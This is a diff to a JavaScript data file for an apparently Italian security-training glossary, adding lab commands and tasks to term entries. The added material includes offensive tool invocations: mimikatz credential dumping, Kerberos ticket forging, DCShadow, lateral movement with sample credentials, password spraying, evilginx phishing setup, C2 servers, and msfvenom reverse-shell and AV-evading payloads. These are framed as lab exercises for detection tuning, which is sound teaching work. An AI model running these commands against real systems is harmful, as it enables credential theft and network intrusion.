               tool: 'WMIPersist',
               note: 'Tecnica fileless: tutto vive nella WMI repository.',
+              code: `$Filter = Set-WmiInstance -Class __EventFilter -Namespace 'root\\subscription' -Arguments @{Name='LabFilter';EventNamespace='root\\cimv2';QueryLanguage='WQL';Query='SELECT * FROM __InstanceCreationEvent WITHIN 60'}
+Write-Host 'Filtro registrato a scopo di test:' $Filter.Name`,
+              task: 'Crea una subscription WMI di test nel laboratorio per esercitare il SOC nella rilevazione di persistenze fileless tramite Sysmon Event ID 19-21.',
             },
             {
               english: 'DLL Hijacking',
@@ -5549,6 +5728,8 @@ export default {
               context: 'post-exploitation',
               difficulty: 'intermediate',
               tool: 'PowerSploit',
+              command: `powershell -c 'Import-Module .\\\\PowerSploit.psd1; Find-PathDLLHijack'`,
+              task: 'Esegui il cmdlet PowerSploit nel laboratorio Windows per individuare directory scrivibili nel PATH e quantificare il rischio di DLL hijacking.',
             },
             {
               english: 'Bootkit',
@@ -5611,6 +5792,8 @@ export default {
               context: 'post-exploitation',
               difficulty: 'intermediate',
               tool: 'Sysinternals PsExec, Impacket psexec.py',
+              command: 'psexec.py lab.internal/admin:Password123@10.10.10.5',
+              task: 'Avvia una sessione PsExec controllata verso un host di laboratorio per generare la telemetria attesa e affinare le regole SIEM su PSEXESVC.',
             },
             {
               english: 'WMI Lateral',
@@ -5622,6 +5805,8 @@ export default {
               context: 'post-exploitation',
               difficulty: 'intermediate',
               tool: 'wmiexec.py',
+              command: 'wmiexec.py lab.internal/admin:Password123@10.10.10.5',
+              task: 'Esegui un movimento laterale WMI nel laboratorio AD per misurare la copertura delle regole di detection dedicate a Win32_Process create.',
             },
             {
               english: 'DCOM',
@@ -5643,6 +5828,8 @@ export default {
               difficulty: 'intermediate',
               tool: 'Impacket',
               note: 'Suite di SecureAuth. Include psexec.py, wmiexec.py, secretsdump.py, GetNPUsers.py.',
+              command: 'GetUserSPNs.py lab.internal/audit:Password123 -request',
+              task: `Usa la suite Impacket nel laboratorio AD per inventariare gli SPN kerberoastabili e fornire al team identita' la lista degli account da rinforzare.`,
             },
             {
               english: 'CrackMapExec',
@@ -5666,6 +5853,8 @@ export default {
               context: 'post-exploitation',
               difficulty: 'intermediate',
               tool: 'nxc',
+              command: 'nxc smb 10.10.10.0/24 -u audit -p Password123 --shares',
+              task: `Lancia NetExec contro la sottorete di laboratorio per inventariare in modo rapido le share SMB accessibili dall'account di audit.`,
             },
             {
               english: 'BloodHound',
@@ -5678,6 +5867,9 @@ export default {
               difficulty: 'intermediate',
               tool: 'BloodHound, SharpHound',
               note: 'Mostra grafi di "shortest path to Domain Admin". Cambio totale per pentest AD.',
+              command:
+                'bloodhound-python -u audit -p Password123 -d lab.internal -ns 10.10.10.5 -c All',
+              task: 'Esegui la raccolta BloodHound nel laboratorio AD per mappare i percorsi di attacco verso Domain Admins e prioritizzare il tiering amministrativo.',
             },
           ],
         },
@@ -5758,6 +5950,8 @@ export default {
               context: 'post-exploitation',
               difficulty: 'intermediate',
               tool: 'mimikatz, Rubeus',
+              command: `mimikatz.exe 'kerberos::golden /user:audit /domain:lab.internal /sid:S-1-5-21-... /target:srv01.lab.internal /service:cifs /rc4:HASH /ptt'`,
+              task: 'Genera un silver ticket nel laboratorio AD isolato per affinare le regole di detection su ticket di servizio non emessi dal KDC.',
             },
             {
               english: 'DCSync',
@@ -5782,6 +5976,8 @@ export default {
               context: 'post-exploitation',
               difficulty: 'intermediate',
               tool: 'mimikatz',
+              command: `mimikatz.exe 'lsadump::dcshadow /object:CN=Audit,DC=lab,DC=internal /attribute:adminCount /value:1'`,
+              task: 'Riproduci un DCShadow nel laboratorio AD segregato per validare le regole basate sui System Access Control List delle scritture replicate.',
             },
             {
               english: 'Constrained Delegation',
@@ -5792,6 +5988,9 @@ export default {
               context: 'post-exploitation',
               difficulty: 'intermediate',
               tool: 'Rubeus s4u',
+              command:
+                'Rubeus.exe s4u /user:svc_app /rc4:HASH /impersonateuser:audit /msdsspn:cifs/srv01.lab.internal /ptt',
+              task: 'Abusa di una delega vincolata nel laboratorio AD per verificare che gli alert su S4U2Proxy individuino le richieste di impersonazione anomale.',
             },
             {
               english: 'Unconstrained Delegation',
@@ -5903,6 +6102,8 @@ export default {
               context: 'social-engineering',
               difficulty: 'intermediate',
               tool: 'evilginx2, modlishka',
+              command: 'git clone https://github.com/kgretzky/evilginx2 && cd evilginx2 && make',
+              task: 'Compila il framework in un lab isolato per studiare la struttura interna di un kit usato negli attacchi reali.',
             },
             {
               english: 'Evilginx',
@@ -5914,6 +6115,8 @@ export default {
               difficulty: 'intermediate',
               tool: 'evilginx2',
               note: 'Cattura cookie di sessione dopo MFA: il vero futuro del phishing.',
+              command: 'evilginx2 -p ./phishlets -developer',
+              task: 'Avvia il proxy in modalita di sviluppo nel lab interno per validare la difesa MFA contro reverse proxy.',
             },
             {
               english: 'Phishing Awareness',
@@ -6062,6 +6265,8 @@ export default {
               context: 'social-engineering',
               difficulty: 'intermediate',
               tool: 'Gophish',
+              command: './gophish',
+              task: 'Lancia il server di simulazione in un ambiente isolato per pianificare campagne di phishing autorizzate dal management.',
             },
             {
               english: 'KnowBe4',
@@ -6084,6 +6289,8 @@ export default {
               context: 'social-engineering',
               difficulty: 'intermediate',
               tool: 'King Phisher',
+              command: 'king-phisher-server -f config.yml',
+              task: 'Avvia il server di campagna nel lab per gestire training di awareness con tracking dei click sui finti link.',
             },
             {
               english: 'theHarvester Subdomain Scan',
@@ -6108,6 +6315,8 @@ export default {
               context: 'social-engineering',
               difficulty: 'intermediate',
               tool: 'Maltego',
+              command: 'maltego',
+              task: 'Apri la suite di OSINT per mappare in lab la superficie pubblica di un dominio interno e ridurla.',
             },
             {
               english: 'Hunter.io',
@@ -6119,6 +6328,8 @@ export default {
               context: 'social-engineering',
               difficulty: 'intermediate',
               tool: 'hunter.io',
+              command: `curl 'https://api.hunter.io/v2/domain-search?domain=example.com&api_key=KEY'`,
+              task: `Interroga l'API per scoprire quali email aziendali sono pubblicate online e proporne la rimozione.`,
             },
             {
               english: 'OSINT for SE',
@@ -6138,6 +6349,8 @@ export default {
               context: 'social-engineering',
               difficulty: 'intermediate',
               tool: 'LinkedIn, ScrapedIn',
+              command: 'linkedin2username -c company-name -o users.txt',
+              task: 'Genera la lista di possibili username dal profilo LinkedIn aziendale per allenare i filtri di brute force.',
             },
             {
               english: 'Email Spoofing',
@@ -6336,6 +6549,8 @@ export default {
               context: 'tools',
               difficulty: 'advanced',
               tool: 'Metasploit',
+              command: 'use exploit/multi/handler',
+              task: 'Imposta un handler generico nel lab per ricevere shell di esercitazione e studiare la post-exploitation.',
             },
             {
               english: 'Post Module',
@@ -6347,6 +6562,8 @@ export default {
               context: 'tools',
               difficulty: 'advanced',
               tool: 'Metasploit',
+              command: 'use post/multi/recon/local_exploit_suggester',
+              task: 'Esegui il suggeritore in lab per individuare exploit locali noti e applicare le patch mancanti.',
             },
             {
               english: 'Workspace',
@@ -6395,6 +6612,8 @@ export default {
               context: 'tools',
               difficulty: 'advanced',
               tool: 'Armitage',
+              command: 'armitage',
+              task: `Apri la GUI di Metasploit in un lab didattico per visualizzare host, servizi e sessioni in un colpo d'occhio.`,
             },
           ],
         },
@@ -6465,6 +6684,8 @@ export default {
               context: 'tools',
               difficulty: 'advanced',
               tool: 'nmap',
+              command: 'nmap --script-help "vuln and safe"',
+              task: 'Consulta le categorie disponibili per scegliere solo script non distruttivi durante un assessment di produzione.',
             },
             {
               english: 'Output Formats',
@@ -6489,6 +6710,8 @@ export default {
               context: 'tools',
               difficulty: 'advanced',
               tool: 'zenmap',
+              command: 'zenmap',
+              task: 'Avvia la GUI di Nmap per visualizzare la topologia degli host scoperti nel lab e confrontare scansioni storiche.',
             },
             {
               english: 'Masscan',
@@ -6525,6 +6748,11 @@ export default {
               context: 'tools',
               difficulty: 'advanced',
               tool: 'python-libnmap',
+              code: `from libnmap.parser import NmapParser
+report = NmapParser.parse_fromfile('scan.xml')
+for host in report.hosts:
+    print(host.address, host.services)`,
+              task: `Analizza l'XML di Nmap con Python per estrarre asset e servizi in un report ordinato per il SOC.`,
             },
           ],
         },
@@ -6544,6 +6772,8 @@ export default {
               difficulty: 'advanced',
               tool: 'wireshark',
               note: 'Originariamente Ethereal. Standard per network forensics e debug protocollo.',
+              command: 'wireshark -r capture.pcap',
+              task: `Apri un PCAP raccolto durante un incidente per ricostruire i flussi sospetti e classificare l'attivita'.`,
             },
             {
               english: 'Display Filter',
@@ -6645,6 +6875,8 @@ export default {
               context: 'tools',
               difficulty: 'advanced',
               tool: 'caido',
+              command: 'caido',
+              task: `Avvia il proxy moderno in un lab di web testing per ispezionare le richieste di un'app prima del rilascio.`,
             },
           ],
         },
@@ -6663,6 +6895,8 @@ export default {
               context: 'tools',
               difficulty: 'advanced',
               tool: 'aircrack-ng',
+              command: 'airmon-ng start wlan0',
+              task: 'Metti la scheda in monitor mode nel lab wireless dedicato per studiare i pacchetti di management 802.11.',
             },
             {
               english: 'sqlmap Tamper Script',
@@ -6700,6 +6934,8 @@ export default {
               context: 'tools',
               difficulty: 'advanced',
               tool: 'recon-ng',
+              command: 'recon-ng -w engagement',
+              task: 'Carica un workspace nel framework OSINT per catalogare sottodomini esposti del tuo perimetro.',
             },
             {
               english: 'Hydra HTTP Form Login',
@@ -6722,6 +6958,8 @@ export default {
               context: 'tools',
               difficulty: 'advanced',
               tool: 'PowerShell-Empire, Starkiller',
+              command: 'powershell-empire server',
+              task: 'Avvia il server del C2 educativo in lab per studiare come gli EDR aziendali rilevano agenti PowerShell.',
             },
             {
               english: 'Sliver',
@@ -6733,6 +6971,8 @@ export default {
               difficulty: 'advanced',
               tool: 'sliver',
               note: 'Sviluppato da BishopFox. Implant in Go, multi-piattaforma.',
+              command: 'sliver-server',
+              task: 'Esegui il C2 di simulazione in lab per validare che le regole Sigma del SOC catturino il beaconing mTLS.',
             },
             {
               english: 'Havoc',
@@ -6743,6 +6983,8 @@ export default {
               context: 'tools',
               difficulty: 'advanced',
               tool: 'havoc',
+              command: 'havoc server --profile profile.yaotl',
+              task: `Avvia il teamserver nel range lab per testare le detection EDR contro l'agente Demon configurato.`,
             },
             {
               english: 'Mythic',
@@ -6754,6 +6996,8 @@ export default {
               context: 'tools',
               difficulty: 'advanced',
               tool: 'mythic',
+              command: 'sudo ./mythic-cli start',
+              task: 'Accendi la piattaforma multi-agente in un lab per esercitazioni purple team e tuning delle regole di detection.',
             },
             {
               english: 'Toolkit Discipline',
@@ -6793,6 +7037,8 @@ export default {
               difficulty: 'advanced',
               tool: 'Cobalt Strike',
               note: 'Sviluppato da Raphael Mudge. Costoso ma usato sia da red team che da APT.',
+              command: './teamserver 10.0.0.1 password',
+              task: 'Avvia il teamserver in un lab autorizzato per esercitazioni di adversary emulation contro il proprio SOC.',
             },
             {
               english: 'Beacon',
@@ -6835,6 +7081,8 @@ export default {
               difficulty: 'advanced',
               tool: 'Empire, Starkiller',
               note: 'Originariamente di Adaptive Threat Division, ora maintained da BC Security.',
+              command: 'powershell-empire client',
+              task: 'Connetti il client al server del lab per studiare i moduli e progettare regole Sigma di detection.',
             },
             {
               english: 'Listener',
@@ -6904,6 +7152,8 @@ export default {
               difficulty: 'advanced',
               tool: 'mimikatz',
               note: 'Open source di Benjamin Delpy. Gato (gattino) nel logo.',
+              command: 'mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit',
+              task: 'Studia in una VM Windows isolata come avviene il dump per costruire regole EDR mirate al furto LSASS.',
             },
             {
               english: 'sekurlsa',
@@ -6940,6 +7190,8 @@ export default {
               context: 'advanced-tools',
               difficulty: 'advanced',
               tool: 'kekeo',
+              command: 'kekeo.exe "tgt::ask /user:victim /domain:lab.local /password:pass"',
+              task: 'Riproduci un flusso Kerberos in un lab AD didattico per capire come gli SPN possono essere abusati.',
             },
             {
               english: 'Rubeus',
@@ -6989,6 +7241,8 @@ export default {
               context: 'advanced-tools',
               difficulty: 'advanced',
               tool: 'SeatBelt',
+              command: 'Seatbelt.exe -group=user',
+              task: 'Esegui il triage di sistema su una VM lab per inventariare configurazioni rischiose e correggerle.',
             },
             {
               english: 'SharpUp',
@@ -6999,6 +7253,8 @@ export default {
               context: 'advanced-tools',
               difficulty: 'advanced',
               tool: 'SharpUp',
+              command: 'SharpUp.exe audit',
+              task: `Analizza in una VM Windows lab i percorsi di privilege escalation per consolidare l'hardening prima del rilascio.`,
             },
             {
               english: 'WinPEAS',
@@ -7030,6 +7286,8 @@ export default {
               difficulty: 'advanced',
               tool: 'BloodHound',
               note: 'Creato da Andy Robbins, Will Schroeder, Rohan Vazarkar. Rivoluzionario per pentest AD.',
+              command: 'bloodhound --no-sandbox',
+              task: `Apri l'interfaccia per visualizzare gli attack path in un dominio AD lab e ridurli con tiering rigoroso.`,
             },
             {
               english: 'SharpHound',
@@ -7077,6 +7335,8 @@ export default {
               context: 'advanced-tools',
               difficulty: 'advanced',
               tool: 'ADRecon',
+              command: 'Invoke-ADRecon -DomainController dc.lab.local',
+              task: 'Genera un report completo sul dominio lab per auditare account, GPO e trust durante un assessment interno.',
             },
             {
               english: 'PingCastle',
@@ -7087,6 +7347,8 @@ export default {
               context: 'advanced-tools',
               difficulty: 'advanced',
               tool: 'PingCastle',
+              command: 'PingCastle.exe --healthcheck --server lab.local',
+              task: `Lancia un health check del dominio lab per ottenere un punteggio di maturita' e priorita' di remediation.`,
             },
             {
               english: 'ADCS',
@@ -7121,6 +7383,8 @@ export default {
               difficulty: 'advanced',
               tool: 'PetitPotam, Coercer',
               note: "PetitPotam, PrinterBug, ShadowCoerce: tutti forzano auth NTLM verso l'attaccante.",
+              command: 'coercer coerce -t dc.lab.local -l attacker.lab.local',
+              task: 'Riproduci la coercion in un dominio lab per validare che SMB signing e patch PetitPotam siano attive.',
             },
             {
               english: 'NTLM Relay',
@@ -7165,6 +7429,8 @@ export default {
               difficulty: 'advanced',
               tool: 'mitm6',
               note: 'Sfrutta che Windows preferisce IPv6 anche su reti IPv4-only.',
+              command: 'mitm6 -d lab.local --no-ra',
+              task: 'Esegui il tool nel segmento lab isolato per dimostrare al team il rischio di IPv6 abilitato di default.',
             },
             {
               english: 'CrackMapExec SMB Module',
@@ -7201,6 +7467,8 @@ export default {
               context: 'advanced-tools',
               difficulty: 'advanced',
               tool: 'Impacket',
+              command: 'pip install impacket',
+              task: 'Installa la suite Python nel lab per studiare protocolli SMB e Kerberos durante esercitazioni di red team.',
             },
             {
               english: 'GetUserSPNs.py',
@@ -7235,6 +7503,8 @@ export default {
               context: 'advanced-tools',
               difficulty: 'advanced',
               tool: 'Impacket',
+              command: 'wmiexec.py lab.local/admin@10.0.0.5',
+              task: 'Connettiti via WMI a un host del dominio lab per testare le detection EDR su esecuzione remota.',
             },
             {
               english: 'evil-winrm',
@@ -7324,6 +7594,8 @@ export default {
               context: 'mobile-hacking',
               difficulty: 'advanced',
               tool: 'jadx',
+              command: 'jadx-gui app.apk',
+              task: 'Apri un APK aziendale nel decompilatore per controllare che il codice non esponga endpoint di debug.',
             },
             {
               english: 'AndroidManifest',
@@ -7353,6 +7625,8 @@ export default {
               context: 'mobile-hacking',
               difficulty: 'advanced',
               tool: 'Drozer',
+              command: 'drozer console connect',
+              task: `Connettiti all'agente sull'emulatore lab per enumerare activity esportate e content provider vulnerabili.`,
             },
             {
               english: 'ADB',
@@ -7385,6 +7659,8 @@ export default {
               context: 'mobile-hacking',
               difficulty: 'advanced',
               tool: 'Genymotion, Android Studio',
+              command: 'emulator -avd Pixel_API_30 -writable-system',
+              task: 'Avvia un emulatore con partizione scrivibile per installare un CA aziendale e ispezionare il traffico TLS.',
             },
           ],
         },
@@ -7480,6 +7756,8 @@ export default {
               context: 'mobile-hacking',
               difficulty: 'advanced',
               tool: 'class-dump',
+              command: 'class-dump -H AppBinary -o headers/',
+              task: 'Estrai gli header Objective-C da un binario decifrato nel lab per pianificare gli hook di analisi.',
             },
             {
               english: 'Hopper',
@@ -7500,6 +7778,8 @@ export default {
               context: 'mobile-hacking',
               difficulty: 'advanced',
               tool: 'keychain-dumper',
+              command: 'keychain_dumper > keychain.txt',
+              task: `Esporta i segreti dal Keychain di un device jailbroken di test per misurare cosa l'app espone localmente.`,
             },
           ],
         },
@@ -7546,6 +7826,8 @@ export default {
               difficulty: 'advanced',
               tool: 'MobSF',
               note: 'Framework open source: dropping APK/IPA dà subito un report di sicurezza.',
+              command: 'docker run -it -p 8000:8000 opensecurity/mobile-security-framework-mobsf',
+              task: 'Accendi il framework di analisi statica per scansionare gli APK aziendali prima della pubblicazione su Play.',
             },
             {
               english: 'Static Analysis Mobile',
@@ -7655,6 +7937,8 @@ export default {
               context: 'mobile-hacking',
               difficulty: 'advanced',
               tool: 'iMobax',
+              command: 'imobax --analyze app.ipa',
+              task: `Mappa i deep link registrati di un'app iOS del lab per validare i controlli sulle URL handler.`,
             },
             {
               english: 'Magisk',
@@ -7689,6 +7973,8 @@ export default {
               difficulty: 'advanced',
               tool: 'reFlutter',
               note: 'Tool che ripatcha un APK Flutter per abilitare il proxying e ispezionare il traffico di rete.',
+              command: 'reflutter app.apk',
+              task: `Patcha un'APK Flutter del lab per abilitare il proxy HTTPS e validare le chiamate API in chiaro.`,
             },
             {
               english: 'Magnet AXIOM',
@@ -7768,6 +8054,8 @@ export default {
               difficulty: 'advanced',
               tool: 'PMapper, Pacu',
               note: 'Identity and Access Management. Privilege escalation tramite policy permissive.',
+              command: 'pmapper --account-id 123456789012 graph create',
+              task: 'Costruisci il grafo IAM del tuo account AWS lab per scoprire percorsi di privilege escalation impliciti.',
             },
             {
               english: 'Instance Metadata',
@@ -7815,6 +8103,8 @@ export default {
               difficulty: 'advanced',
               tool: 'Pacu',
               note: 'Framework open source di Rhino Security Labs per il pentest di ambienti AWS.',
+              command: 'pacu',
+              task: 'Apri il framework di pentest AWS in un account lab dedicato per esercitare la detection di GuardDuty.',
             },
             {
               english: 'CloudTrail',
@@ -7889,6 +8179,8 @@ export default {
               context: 'cloud-hacking',
               difficulty: 'advanced',
               tool: 'MSOLSpray, omnispray',
+              command: 'Invoke-MSOLSpray -UserList users.txt -Password Spring2024!',
+              task: 'Simula uno spray controllato sul tenant lab per validare le regole Conditional Access e il logging Entra.',
             },
             {
               english: 'AADInternals',
@@ -7901,6 +8193,8 @@ export default {
               difficulty: 'advanced',
               tool: 'AADInternals',
               note: 'Modulo PowerShell offensivo per ricognizione e attacco contro Entra ID (ex Azure AD).',
+              command: 'Install-Module AADInternals -Scope CurrentUser',
+              task: 'Installa il modulo PowerShell nel lab per studiare gli abusi su Entra ID e affinare le regole Sentinel.',
             },
             {
               english: 'ROADtools',
@@ -7912,6 +8206,8 @@ export default {
               difficulty: 'advanced',
               tool: 'ROADtools, ROADrecon',
               note: 'Toolkit Python per esplorare e ricognire tenant Entra ID, con visualizzazione in BloodHound-style.',
+              command: 'roadrecon auth -u admin@lab.onmicrosoft.com',
+              task: 'Dumpa la directory del tenant lab in Neo4j per visualizzare ruoli e applicazioni a rischio.',
             },
             {
               english: 'Azure Storage Enum',
@@ -7923,6 +8219,8 @@ export default {
               context: 'cloud-hacking',
               difficulty: 'advanced',
               tool: 'MicroBurst',
+              command: 'Invoke-EnumerateAzureBlobs -Base companyname',
+              task: 'Cerca container blob pubblici legati alla tua azienda per chiudere quelli che espongono dati sensibili.',
             },
             {
               english: 'GCP IAM',
@@ -8036,6 +8334,8 @@ export default {
               context: 'cloud-hacking',
               difficulty: 'advanced',
               tool: 'TruffleHog, gitleaks',
+              command: 'trufflehog filesystem ./repo --only-verified',
+              task: 'Scansiona la history Git per trovare chiavi AWS e ruotarle prima di pubblicare il repository.',
             },
             {
               english: 'Overprivileged Identity',
@@ -8089,6 +8389,8 @@ export default {
               context: 'cloud-hacking',
               difficulty: 'advanced',
               tool: 'subjack, subzy',
+              command: 'subjack -w domains.txt -t 50 -ssl -v -o results.txt',
+              task: 'Verifica i sottodomini aziendali per individuare DNS pendenti e prevenire takeover su servizi dismessi.',
             },
           ],
         },
@@ -8140,6 +8442,8 @@ export default {
               difficulty: 'advanced',
               tool: 'kubectl',
               note: 'Piattaforma open source per orchestrare container; spesso abbreviata K8s (8 lettere tra K e s).',
+              command: 'kubectl get pods --all-namespaces',
+              task: 'Elenca i pod del cluster lab per confermare che workload sospetti non siano stati schedulati di nascosto.',
             },
             {
               english: 'kubectl',
@@ -8175,6 +8479,8 @@ export default {
               context: 'cloud-hacking',
               difficulty: 'advanced',
               tool: 'kube-hunter',
+              command: 'kube-hunter --remote 10.0.0.5',
+              task: 'Scansiona il cluster lab per scoprire endpoint kubelet non autenticati e chiuderli prima del go-live.',
             },
             {
               english: 'kubeaudit',
@@ -8186,6 +8492,8 @@ export default {
               context: 'cloud-hacking',
               difficulty: 'advanced',
               tool: 'kubeaudit',
+              command: 'kubeaudit all -f manifest.yaml',
+              task: 'Audita un manifest Kubernetes per individuare pod che girano come root o senza securityContext.',
             },
             {
               english: 'Peirates',
@@ -8197,6 +8505,8 @@ export default {
               context: 'cloud-hacking',
               difficulty: 'advanced',
               tool: 'Peirates',
+              command: 'peirates',
+              task: 'Lancia il tool dentro un pod lab per dimostrare al team le conseguenze di un service account sovra-privilegiato.',
             },
             {
               english: 'ScoutSuite',
@@ -8262,6 +8572,8 @@ export default {
               difficulty: 'advanced',
               tool: 'FLOSS',
               note: 'FLARE Obfuscated String Solver: tool Mandiant che estrae stringhe nascoste tramite emulazione.',
+              command: 'floss sample.exe',
+              task: 'Estrai stringhe deoffuscate da un campione sospetto nel sandbox per arricchire gli IOC del SOC.',
             },
             {
               english: 'PE Analysis',
@@ -8383,6 +8695,8 @@ export default {
               difficulty: 'advanced',
               tool: 'Cuckoo',
               note: 'Sandbox open source di analisi malware automatizzata: esegue il sample in una VM e raccoglie comportamento.',
+              command: 'cuckoo submit sample.exe',
+              task: 'Sottometti un campione in sandbox isolata per ottenere un report comportamentale completo e classificarlo.',
             },
             {
               english: 'Any.Run',
@@ -8462,6 +8776,8 @@ export default {
               difficulty: 'advanced',
               tool: 'INetSim',
               note: 'Simulatore di servizi di rete che risponde al malware come fosse un Internet reale, ma in laboratorio.',
+              command: 'inetsim --conf /etc/inetsim/inetsim.conf',
+              task: 'Accendi il simulatore di servizi di rete nel sandbox per osservare i tentativi di contatto del malware.',
             },
           ],
         },
@@ -8491,6 +8807,8 @@ export default {
               difficulty: 'advanced',
               tool: 'Ghidra',
               note: 'Suite di reverse engineering rilasciata dalla NSA nel 2019, alternativa gratuita a IDA Pro.',
+              command: 'ghidraRun',
+              task: 'Apri la suite NSA in un lab forense per fare reverse di un binario sospetto e generare detection mirate.',
             },
             {
               english: 'IDA Pro',
@@ -8580,6 +8898,12 @@ export default {
               difficulty: 'advanced',
               tool: 'angr',
               note: 'Framework Python di binary analysis sviluppato a UCSB: combina symbolic execution e static analysis.',
+              code: `import angr
+proj = angr.Project('sample', auto_load_libs=False)
+state = proj.factory.entry_state()
+simgr = proj.factory.simulation_manager(state)
+simgr.explore(find=0x400666)`,
+              task: 'Esplora simbolicamente un binario in lab per scoprire input che colpiscono branch nascosti di un sample sospetto.',
             },
           ],
         },
@@ -8747,6 +9071,9 @@ export default {
               context: 'exploit-dev',
               difficulty: 'advanced',
               tool: 'msfvenom -e x86/alpha_mixed',
+              command:
+                'msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.0.1 -e x86/alpha_mixed -f raw',
+              task: 'Genera un payload alfanumerico in lab per studiare come gli exploit aggirano filtri che ammettono solo input stampabili.',
             },
             {
               english: 'Polymorphic Encoding',
@@ -8758,6 +9085,9 @@ export default {
               context: 'exploit-dev',
               difficulty: 'advanced',
               tool: 'shikata_ga_nai',
+              command:
+                'msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -f exe -o payload.exe',
+              task: 'Crea un payload polimorfico nel lab per capire come la mutazione di byte sfida le signature antivirus.',
             },
             {
               english: 'Self-Modifying Code',
@@ -8945,6 +9275,8 @@ export default {
               difficulty: 'advanced',
               tool: 'AFL, AFL++',
               note: 'Creato da Michał Zalewski. AFL++ è il fork attivamente mantenuto.',
+              command: 'afl-fuzz -i seeds -o output -- ./target @@',
+              task: 'Avvia una campagna di fuzzing su un parser interno per scoprire crash prima del rilascio in produzione.',
             },
             {
               english: 'AFL++',
@@ -8956,6 +9288,8 @@ export default {
               difficulty: 'advanced',
               tool: 'AFL++',
               note: 'Fork moderno e attivamente mantenuto di AFL: integra le migliori contribuzioni della community.',
+              command: 'afl-fuzz -i corpus -o findings -Q -- ./binary @@',
+              task: 'Fuzza con QEMU mode un binario chiuso del lab per individuare bug di parsing senza i sorgenti.',
             },
             {
               english: 'libFuzzer',
@@ -8968,6 +9302,11 @@ export default {
               difficulty: 'advanced',
               tool: 'libFuzzer (LLVM)',
               note: 'Engine di fuzzing in-process incluso in LLVM: link contro libFuzzer e definisci LLVMFuzzerTestOneInput.',
+              code: `extern "C" int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {
+    parse_input(data, size);
+    return 0;
+}`,
+              task: 'Definisci un harness in-process per integrare il fuzzer nel CI e scoprire crash a ogni commit della libreria.',
             },
             {
               english: 'Coverage-Guided Fuzzing',
@@ -9044,6 +9383,8 @@ export default {
               difficulty: 'advanced',
               tool: 'Honggfuzz',
               note: 'Fuzzer sviluppato in Google: supporta feedback hardware e fuzzing parallelo a basso overhead.',
+              command: 'honggfuzz -i corpus -- ./target ___FILE___',
+              task: 'Lancia il fuzzer in lab per usare il feedback hardware Intel PT e individuare bug con overhead minimo.',
             },
           ],
         },
@@ -9541,6 +9882,8 @@ export default {
               difficulty: 'advanced',
               tool: 'Atomic Red Team',
               note: 'Libreria open source di Red Canary con test atomici di attacco mappati su tecniche MITRE ATT&CK.',
+              command: 'Invoke-AtomicTest T1059.001',
+              task: 'Esegui il test atomico in lab per verificare che le regole di detection PowerShell del SOC scattino davvero.',
             },
             {
               english: 'CALDERA',
@@ -9553,6 +9896,8 @@ export default {
               difficulty: 'advanced',
               tool: 'CALDERA',
               note: 'Framework open source di MITRE per automazione di adversary emulation, basato sul knowledge graph ATT&CK.',
+              command: 'python server.py --insecure',
+              task: 'Accendi il framework MITRE in lab per orchestrare adversary emulation e stressare EDR e SIEM aziendali.',
             },
             {
               english: 'Purple Team Exercise',
@@ -9583,6 +9928,17 @@ export default {
               context: 'red-team',
               difficulty: 'advanced',
               tool: 'Sigma',
+              code: `title: Suspicious PowerShell Encoded Command
+logsource:
+  product: windows
+  service: powershell
+detection:
+  selection:
+    EventID: 4104
+    ScriptBlockText|contains: '-EncodedCommand'
+  condition: selection
+level: high`,
+              task: 'Scrivi una regola portabile per rilevare PowerShell con comando codificato e distribuirla sul SIEM aziendale.',
             },
             {
               english: 'Initial Access',
@@ -10878,6 +11234,8 @@ export default {
               context: 'ctf-labs',
               difficulty: 'advanced',
               tool: 'VirtualBox',
+              command: 'VBoxManage list vms',
+              task: `Elenca le VM presenti sull'host lab per inventariare l'ambiente di pratica prima di accendere nuove macchine.`,
             },
             {
               english: 'VMware',
